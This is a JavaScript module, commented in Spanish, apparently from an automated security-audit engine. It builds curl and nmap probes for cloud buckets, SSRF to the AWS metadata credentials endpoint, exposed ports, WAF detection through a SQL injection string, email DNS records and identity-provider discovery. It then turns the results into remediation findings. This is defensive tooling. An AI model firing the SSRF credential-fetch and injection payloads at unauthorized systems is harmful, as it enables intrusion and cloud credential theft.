  if (!blobRef || !blobRef.container) return [];
  return [
    step("p1-azureblob-check", "curl", [
      "-s", "-L", "--max-time", maxTime,
      `https://${blobRef.account}.blob.core.windows.net/${blobRef.container}?restype=container&comp=list`,
    ], null, {
      desc: `Contenedor Azure Blob referenciado por la app: ¿listado público? (${blobRef.account}/${blobRef.container})`,
    }),
  ];
}

export function gcsBucketCheckStep(step, bucketName, maxTime = "12") {
  if (!bucketName) return [];
  return [
    step("p1-gcs-bucket-check", "curl", [
      "-s", "-L", "--max-time", maxTime,
      `https://storage.googleapis.com/storage/v1/b/${bucketName}/o`,
    ], null, {
      desc: `Bucket GCS referenciado por la app: ¿listado público? (${bucketName})`,
    }),
  ];
}

export const AZURE_BLOB_LISTING_RE = /<EnumerationResults/i;
export const GCS_LISTING_RE = /"kind":\s*"storage#objects"/i;

/* ------------------------------------------------------------------------ *
 * SSRF genérico → AWS Instance Metadata Service (IMDS, 169.254.169.254):
 * si algún parámetro típico de "fetch de URL" acepta la IMDS y la respuesta
 * refleja contenido de metadata/credenciales, es SSRF confirmado hacia la
 * superficie cloud más crítica que existe. Una sola petición de lectura
 * por parámetro, nada destructivo.
 * https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html
 * ------------------------------------------------------------------------ */
export const SSRF_IMDS_PARAMS = ["url", "callback", "webhook", "image", "avatar", "feed", "uri", "path", "target", "proxy"];
export const SSRF_IMDS_TEST_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";

export function ssrfImdsCurlSteps(step, prefix, baseUrl, maxTime = "10") {
  return SSRF_IMDS_PARAMS.map((param) =>
    step(`${prefix}-${param}`, "curl", [
      "-s", "-L", "--max-time", maxTime,
      "-G", "--data-urlencode", `${param}=${SSRF_IMDS_TEST_URL}`,
      baseUrl,
    ], null, {
      desc: `Sonda SSRF: ¿${param}= reenvía la petición a metadata AWS?`,
    }),
  );
}

/** Señal fuerte (credencial real filtrada) vs. señal débil (solo categorías IMDS listadas). */
export const SSRF_IMDS_STRONG_RE = /"AccessKeyId"\s*:|"SecretAccessKey"\s*:/i;
export const SSRF_IMDS_WEAK_RE = /\bami-id\b|\binstance-id\b|\bsecurity-credentials\b|\blocal-ipv4\b/i;

/* ------------------------------------------------------------------------ *
 * Cortafuegos — dos capas:
 *
 * 1) Caja negra (lo que el informe muestra siempre): nmap de perímetro
 *    (open vs filtered) + WAF que BLOQUEA una sonda inofensiva. No toca
 *    iptables del cliente; infiere el filtro desde fuera, igual que un
 *    atacante real.
 * 2) Caja gris (solo si el target ES el host donde corre el motor:
 *    127.0.0.1/localhost): lectura de ufw/iptables/nft. Ahí sí son las
 *    reglas activas del sistema auditado. Nunca se corre contra un host
 *    remoto: ese ruleset sería el de Kali, no el del cliente.
 * ------------------------------------------------------------------------ */

export const PERIMETER_PORTS = [
  "21", "22", "23", "25", "53", "80", "110", "139", "143", "443", "445",
  "1433", "1521", "2049", "3306", "3389", "5432", "5900", "6379",
  "8080", "8443", "9200", "11211", "27017",
];

/** Servicios que no deberían estar en 0.0.0.0/0. SSH es habitual; el resto es superficie grave. */
export const EXPOSED_SERVICE_RISK = {
  21: { name: "FTP", severity: "Medium" },
  22: { name: "SSH", severity: "Low" },
  23: { name: "Telnet", severity: "High" },
  139: { name: "NetBIOS", severity: "High" },
  445: { name: "SMB", severity: "High" },
  1433: { name: "MSSQL", severity: "High" },
  1521: { name: "Oracle", severity: "High" },
  2049: { name: "NFS", severity: "High" },
  3306: { name: "MySQL/MariaDB", severity: "High" },
  3389: { name: "RDP", severity: "High" },
  5432: { name: "PostgreSQL", severity: "High" },
  5900: { name: "VNC", severity: "High" },
  6379: { name: "Redis", severity: "High" },
  9200: { name: "Elasticsearch", severity: "High" },
  11211: { name: "Memcached", severity: "High" },
  27017: { name: "MongoDB", severity: "High" },
};

export function perimeterNmapArgs(host, extraPort) {
  const ports = new Set(PERIMETER_PORTS);
  const extra = String(extraPort || "").trim();
  if (/^\d+$/.test(extra)) ports.add(extra);
  return ["-Pn", "-sT", "-p", [...ports].sort((a, b) => Number(a) - Number(b)).join(","), host];
}

/**
 * Parsea la tabla clásica de nmap: "PORT STATE SERVICE".
 * Ignora líneas de cabecera y host-down.
 */
export function parseNmapPortTable(nmapText) {
  const open = [];
  const filtered = [];
  const closed = [];
  const re = /^(\d+)\/tcp\s+(open|filtered|closed)\b(?:\s+(\S+))?/gim;
  let m;
  while ((m = re.exec(String(nmapText || "")))) {
    const row = { port: Number(m[1]), state: m[2].toLowerCase(), service: m[3] || "" };
    if (row.state === "open") open.push(row);
    else if (row.state === "filtered") filtered.push(row);
    else closed.push(row);
  }
  return { open, filtered, closed };
}

export function perimeterFirewallFindings(nmapText) {
  const { open, filtered } = parseNmapPortTable(nmapText);
  const out = [];
  const seenRisk = new Set();
  for (const row of open) {
    const risk = EXPOSED_SERVICE_RISK[row.port];
    if (!risk || seenRisk.has(row.port)) continue;
    seenRisk.add(row.port);
    const svc = risk.name;
    out.push({
      title: `${svc} (TCP/${row.port}) expuesto a Internet sin filtrar`,
      severity: risk.severity,
      description: `nmap desde fuera ve ${row.port}/tcp open (${row.service || svc}). Ese servicio no debería ser alcanzable desde 0.0.0.0/0: es superficie de fuerza bruta, RCE conocidos o dump de datos (CWE-284). Un Security Group, NACL, ufw o iptables debería dejarlo solo en la red de administración.`,
      remediation: `Cerrar ${row.port}/tcp al mundo. UFW: \`ufw deny ${row.port}/tcp\` y permitir solo la IP de administración (\`ufw allow from 10.0.0.0/8 to any port ${row.port}\`). iptables: \`-A INPUT -p tcp --dport ${row.port} -s <red-admin> -j ACCEPT\` y \`-A INPUT -p tcp --dport ${row.port} -j DROP\`. En AWS: Security Group sin 0.0.0.0/0 en ese puerto.`,
    });
  }
  if (filtered.length) {
    const sample = filtered.slice(0, 8).map((r) => `${r.port}/tcp`).join(", ");
    out.push({
      title: `Perímetro con filtrado de paquetes (${filtered.length} puerto(s) filtered)`,
      severity: "Info",
      description: `nmap marca ${filtered.length} puerto(s) como filtered (drop/NACL/SG/WAF de red, no RST): ${sample}${filtered.length > 8 ? "…" : ""}. Es contexto de gobierno: hay un filtro delante del host, no una vulnerabilidad. Explica timeouts de otras sondas.`,
      remediation: "Ninguna por el filtrado en sí. Revisar que los puertos de aplicación previstos (80/443) sigan open y que los de gestión (22, 3389, BD) sigan filtered o closed desde Internet.",
    });
  }
  return out;
}

/** Sonda inofensiva que un WAF con CRS/OWASP suele cortar (403/406 + página de bloqueo). */
export const WAF_TRIGGER_QUERY = "ds_waf_probe=1'+UNION+SELECT+NULL--";
export const WAF_BLOCK_STATUS_RE = /HTTP\/1\.[01]\s+(403|406|419|429|501|503)\b|^DS_HTTP:(403|406|419|429|501|503)\b/im;
export const WAF_BLOCK_BODY_RE = /attention required|cloudflare|just a moment|request rejected|mod_security|modsecurity|the requested url was rejected|blocked by|web application firewall|not acceptable|access denied|incident id|support id|sqli detected|anomaly score/i;

export function wafTriggerFindings(probeText) {
  const t = String(probeText || "");
  if (!t.trim()) return [];
  const blocked = WAF_BLOCK_STATUS_RE.test(t) && WAF_BLOCK_BODY_RE.test(t);
  const blockedStatusOnly = WAF_BLOCK_STATUS_RE.test(t) && /forbidden|not acceptable|rejected/i.test(t);
  if (!blocked && !blockedStatusOnly) return [];
  return [{
    title: "WAF activo: bloqueó una sonda de inyección (caja negra)",
    severity: "Info",
    description: "Una petición GET con un payload clásico de UNION SELECT en query string fue cortada por el perímetro (HTTP 403/406/429/5xx + página/firma de WAF). No es vulnerabilidad: documenta que hay control activo delante de la app, no solo un CDN que reenvía.",
    remediation: "Ninguna. Verificar que las reglas cubren OWASP CRS (SQLi, XSS, LFI) y que no hay bypass por otro vhost/API sin el mismo WAF.",
  }];
}

export function missingWafFinding(headText, triggerText, isPublicDomain) {
  if (!isPublicDomain) return [];
  const alreadyWaf = wafFindings(headText).length > 0;
  const blocked = wafTriggerFindings(triggerText).length > 0;
  if (alreadyWaf || blocked) return [];
  return [{
    title: "Sin WAF/CDN identificable desde caja negra",
    severity: "Low",
    description: "Ni las cabeceras de la raíz ni una sonda de inyección inofensiva identifican un WAF/CDN delante del dominio público. La aplicación queda expuesta a Internet sin esa capa. No prueba que no exista un filtro opaco, pero sí que no hay huella ni bloqueo observable.",
    remediation: "Desplegar WAF (Cloudflare, AWS WAF, ModSecurity/OWASP CRS, o el del proveedor) delante de 80/443; bloquear SQLi/XSS/LFI por defecto; no publicar orígenes de API sin el mismo control.",
  }];
}

function looksLikePermissionDenied(text) {
  return /permission denied|operation not permitted|you must be root|must be root|not found|command not found/i.test(String(text || ""));
}

/**
 * Interpreta ufw/iptables/nft YA leídos en el host local. Si no hay
 * privilegios o el binario no existe, no inventa hallazgos (el paso queda
 * en el feed para el operador).
 */
export function hostFirewallFindings(ufwText, iptablesText, nftText) {
  const ufw = String(ufwText || "");
  const ipt = String(iptablesText || "");
  const nft = String(nftText || "");
  const out = [];

  if (ufw.trim() && !looksLikePermissionDenied(ufw)) {
    if (/Status:\s*inactive/i.test(ufw)) {
      out.push({
        title: "UFW inactivo en el host auditado",
        severity: "Medium",
        description: "ufw status verbose reporta Status: inactive. En un servidor Linux que sirve la aplicación, el host firewall está apagado: cualquier puerto en LISTEN queda expuesto al segmento de red (CWE-284). Complementa, no sustituye, al Security Group de la nube.",
        remediation: "`ufw default deny incoming`, `ufw allow 22/tcp` (solo red de admin), `ufw allow 80,443/tcp`, `ufw enable`. Revisar que Docker no publique puertos con 0.0.0.0 si no deben ser públicos.",
      });
    } else if (/Status:\s*active/i.test(ufw)) {
      if (/Default:\s*allow\s+\(incoming\)/i.test(ufw) || /Default:\s*allow$/im.test(ufw)) {
        out.push({
          title: "UFW activo pero política por defecto ALLOW",
          severity: "High",
          description: "UFW está encendido con default allow incoming: las reglas explícitas de deny no cubren puertos nuevos que un servicio abra mañana. La postura correcta es default deny + allow de lo estrictamente necesario.",
          remediation: "`ufw default deny incoming` y allow solo 22 (admin), 80 y 443 (o el puerto de la app).",
        });
      } else {
        out.push({
          title: "UFW activo (default deny) en el host auditado",
          severity: "Info",
          description: "El host tiene UFW activo. Contexto de gobierno de caja gris: hay control local de paquetes además del perímetro de red/nube.",
          remediation: "Ninguna. Revisar que los allow coincidan con el alcance publicado (no dejar 3306/6379/22 abiertos a Anywhere).",
        });
      }
    }
  }

  const iptReadable = ipt.trim() && !looksLikePermissionDenied(ipt);
  if (iptReadable) {
    const ufwActive = /Status:\s*active/i.test(ufw) || /Chain ufw-/i.test(ipt);
    if (/Chain INPUT \(policy ACCEPT\)/i.test(ipt) && !ufwActive) {
      out.push({
        title: "iptables INPUT con política ACCEPT (sin UFW activo)",
        severity: "Medium",
        description: "La cadena INPUT tiene policy ACCEPT y no hay UFW activo encima. El kernel acepta tráfico a cualquier puerto en LISTEN salvo reglas DROP puntuales — equivalente a no tener host firewall.",
        remediation: "Instalar y activar UFW (default deny) o pasar INPUT a DROP/REJECT y allow explícito de 22/80/443. Evitar Docker publicando en 0.0.0.0.",
      });
    } else if (/Chain INPUT \(policy DROP\)|Chain INPUT \(policy REJECT\)/i.test(ipt)) {
      out.push({
        title: "iptables INPUT con política default deny",
        severity: "Info",
        description: "iptables INPUT está en DROP/REJECT. El host filtra por defecto; solo entra lo allow-listeado.",
        remediation: "Ninguna. Auditar que no haya -j ACCEPT a 0.0.0.0/0 en puertos de gestión o de base de datos.",
      });
    }
  }

  const nftReadable = nft.trim() && !looksLikePermissionDenied(nft);
  if (nftReadable && /hook input/i.test(nft) && /policy accept/i.test(nft) && !/Status:\s*active/i.test(ufw)) {
    if (!out.some((f) => /iptables INPUT con política ACCEPT/i.test(f.title))) {
      out.push({
        title: "nftables input hook con policy accept",
        severity: "Medium",
        description: "nft list ruleset muestra un hook input en policy accept. Igual que iptables ACCEPT: el host no niega por defecto.",
        remediation: "Cambiar el hook input a drop/reject y allow solo los puertos publicados, o activar UFW encima.",
      });
    }
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * Email/domain security — SPF y DMARC, sobre TXT ya obtenido por dig. Pasivo:
 * no envía correo, solo interpreta registros públicos. Ausencia o política
 * débil de SPF/DMARC habilita spoofing/phishing usando el dominio auditado.
 * ------------------------------------------------------------------------ */
export const SPF_RECORD_RE = /v=spf1[^"'\n]*/i;
export const DMARC_RECORD_RE = /v=DMARC1[^"'\n]*/i;

export function domainSecurityFindings(txtText, dmarcText, root) {
  const out = [];
  const txt = String(txtText || "");
  const dmarc = String(dmarcText || "");
  const domain = root || "el dominio";

  const spfMatch = txt.match(SPF_RECORD_RE);
  if (!spfMatch) {
    out.push({
      title: `Dominio ${domain} sin registro SPF`,
      severity: "Medium",
      description: `No hay TXT con v=spf1 para ${domain} (CWE-290). Sin SPF, cualquiera puede enviar correo falsificando el remitente @${domain}: es la base técnica de campañas de phishing/BEC contra clientes y empleados que confían en el dominio.`,
      remediation: `Publicar un registro SPF (TXT) que enumere los emisores autorizados y termine en -all (hard fail), p.ej.: "v=spf1 include:_spf.google.com -all".`,
    });
  } else {
    const spf = spfMatch[0];
    if (/\+all\b/i.test(spf)) {
      out.push({
        title: `SPF de ${domain} permite cualquier origen (+all)`,
        severity: "High",
        description: `El registro SPF de ${domain} termina en +all: autoriza explícitamente a CUALQUIER servidor a enviar correo como @${domain} (CWE-290). Es equivalente a no tener SPF, pero además parece configurado a propósito.`,
        remediation: `Cambiar +all por -all (hard fail) y enumerar solo los emisores reales autorizados (include:, ip4:, ip6:).`,
      });
    } else if (!/-all\b/i.test(spf)) {
      out.push({
        title: `SPF de ${domain} sin hard fail (-all)`,
        severity: "Low",
        description: `El registro SPF de ${domain} no termina en -all (usa ~all/softfail, ?all/neutral, o ningún mecanismo all). Los correos falsificados suelen entregarse igual, marcados como sospechosos como mucho, según la política del receptor.`,
        remediation: `Terminar el registro SPF en -all una vez validados todos los emisores legítimos, para que el receptor rechace explícitamente el resto.`,
      });
    }
  }

  const dmarcMatch = dmarc.match(DMARC_RECORD_RE);
  if (!dmarcMatch) {
    out.push({
      title: `Dominio ${domain} sin política DMARC`,
      severity: "Medium",
      description: `No hay TXT v=DMARC1 en _dmarc.${domain} (CWE-290). Sin DMARC no hay política de qué hacer con correo que falla SPF/DKIM, ni reporte agregado (rua=) para detectar abuso del dominio en curso.`,
      remediation: `Publicar TXT en _dmarc.${domain}: "v=DMARC1; p=quarantine; rua=mailto:dmarc-reports@${domain}"; escalar a p=reject tras validar que no rompe correo legítimo.`,
    });
  } else {
    const pMatch = dmarcMatch[0].match(/;\s*p=(\w+)/i);
    const policy = pMatch ? pMatch[1].toLowerCase() : null;
    if (policy === "none") {
      out.push({
        title: `DMARC de ${domain} en modo monitorización (p=none)`,
        severity: "Low",
        description: `DMARC está publicado pero con p=none: el dominio recibe reportes de spoofing (si rua está configurado) pero no bloquea ni pone en cuarentena nada. Correo falsificado que falla SPF/DKIM llega igual a la bandeja del destinatario.`,
        remediation: `Tras validar los reportes rua/ruf, subir la política a p=quarantine y finalmente p=reject.`,
      });
    }
  }

  return out;
}

/* ------------------------------------------------------------------------ *
 * Org attack surface — ASN/organización del target vía RDAP de IP (pasivo,
 * mismo mecanismo HTTPS que el WHOIS/RDAP de dominio ya existente). Solo
 * contexto: qué red/organización anuncia la IP, útil para verificar que el
 * host en scope realmente pertenece al cliente y no a un tercero (CDN,
 * hosting compartido) antes de reportarlo como activo propio.
 * ------------------------------------------------------------------------ */
export function ipRdapCheckStep(step, ip, maxTime = "15") {
  if (!ip) return [];
  return [
    step("p1-osint-rdap-ip", "curl", [
      "-s", "--max-time", maxTime, `https://rdap.org/ip/${ip}`,
    ], null, {
      desc: `RDAP de la IP ${ip}: ASN/organización que la anuncia`,
    }),
  ];
}

export function orgAttackSurfaceFindings(rdapIpText, host, ip) {
  const out = [];
  const text = String(rdapIpText || "");
  if (!text.trim()) return out;
  let json = null;
  try { json = JSON.parse(text); } catch { /* respuesta no-JSON (rate limit, error) */ }
  if (!json) return out;

  const name = json.name || null;
  const handle = json.handle || null;
  const entities = Array.isArray(json.entities) ? json.entities : [];
  const orgNames = entities
    .map((e) => (Array.isArray(e.vcardArray) && e.vcardArray[1]
      ? (e.vcardArray[1].find((v) => v[0] === "fn") || [])[3]
      : null))
    .filter(Boolean);

  if (name || handle || orgNames.length) {
    out.push({
      title: `IP de ${host || ip} anunciada por ${orgNames[0] || name || handle}`,
      severity: "Info",
      description: `RDAP de ${ip} identifica la red como "${name || handle}"${orgNames.length ? ` (organización: ${orgNames.join(", ")})` : ""}. Contexto de superficie: confirma si el host pertenece a infraestructura propia del cliente o a un tercero (CDN, cloud compartido, hosting) — relevante para no reportar como "activo propio" algo que no lo es, o para ampliar el scope si aparece infraestructura hermana bajo la misma organización.`,
      remediation: "Ninguna: es contexto de inventario de activos, no una vulnerabilidad. Confirmar con el cliente si la organización identificada coincide con el alcance autorizado.",
    });
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * Identity Provider recon — SOLO descubrimiento pasivo de tenant (una
 * petición GET a un endpoint público de metadata/realm, sin probar
 * credenciales ni enumerar usuarios). Confirma qué IdP gestiona el dominio
 * (M365/Entra ID, Google Workspace, Okta) para dimensionar el ataque de
 * phishing/password-spray en el informe — nunca ejecuta el ataque.
 *
 * Enumeración de usuarios pre-auth (validar qué correos existen contra el
 * IdP) es deliberadamente MÁS invasiva que un discovery pasivo — se deja
 * fuera del playbook determinista y solo debe ofrecerse en modo agente
 * ReAct con gate de aprobación explícita (DANGEROUS_TOOLS en agent.js),
 * nunca automática.
 * ------------------------------------------------------------------------ */
export function idpDiscoveryCurlSteps(step, root, maxTime = "12") {
  if (!root) return [];
  return [
    step("p1-idp-m365-realm", "curl", [
      "-s", "--max-time", maxTime,
      `https://login.microsoftonline.com/getuserrealm.srf?login=user@${root}&xml=1`,
    ], null, {
      desc: `Descubrimiento pasivo de tenant M365/Entra ID para ${root}`,
    }),
    step("p1-idp-okta-wellknown", "curl", [
      "-s", "--max-time", maxTime, "-o", "/dev/null", "-w", "%{http_code}",
      `https://${root}/.well-known/openid-configuration`,
    ], null, {
      desc: `¿${root} expone metadata OIDC propia (Okta/Auth0/IdP self-hosted)?`,
    }),
  ];
}

export const M365_NAMESPACE_RE = /NameSpaceType>\s*(Managed|Federated)\s*</i;
export const M365_FEDERATION_BRAND_RE = /FederationBrandName>([^<]+)</i;

export function idpDiscoveryFindings(m365Text, oidcHttpCode, root) {
  const out = [];
  const m365 = String(m365Text || "");
  const domain = root || "el dominio";

  const nsMatch = m365.match(M365_NAMESPACE_RE);
  if (nsMatch) {
    const type = nsMatch[1];
    const brandMatch = m365.match(M365_FEDERATION_BRAND_RE);
    out.push({
      title: `${domain} confirmado como tenant Microsoft 365/Entra ID (${type})`,
      severity: "Info",
      description: `El endpoint público getuserrealm.srf confirma que ${domain} es un tenant ${type === "Federated" ? "federado (ADFS/IdP externo)" : "gestionado (cloud-only o password hash sync)"} de Microsoft 365/Entra ID${brandMatch ? ` — marca de federación: ${brandMatch[1]}` : ""}. Contexto de superficie de ataque: dimensiona el riesgo de password-spray contra login.microsoftonline.com y de phishing dirigido a Office 365. NO se ha intentado ninguna credencial ni enumerado usuarios — solo descubrimiento de tenant.`,
      remediation: "Ninguna acción técnica por este hallazgo en sí. Recomendar MFA obligatorio, Conditional Access y bloqueo de protocolos legacy (IMAP/POP/SMTP básico) que son el vector típico de password-spray contra M365.",
    });
  }

  if (String(oidcHttpCode || "").trim() === "200") {
    out.push({
      title: `${domain} expone metadata OIDC propia (/.well-known/openid-configuration)`,
      severity: "Info",
      description: `${domain} responde 200 en /.well-known/openid-configuration: aloja su propio Identity Provider (Okta, Auth0, Keycloak u otro OIDC self-hosted) en vez de, o además de, un IdP SaaS externo. Contexto de superficie: revisar issuer, authorization_endpoint y jwks_uri expuestos para banca de ataque de fase 2 (nunca ejecutada aquí).`,
      remediation: "Ninguna: es descubrimiento pasivo. Verificar que el endpoint no filtre configuración interna más allá de lo estándar OIDC.",
    });
  }

  return out;
}
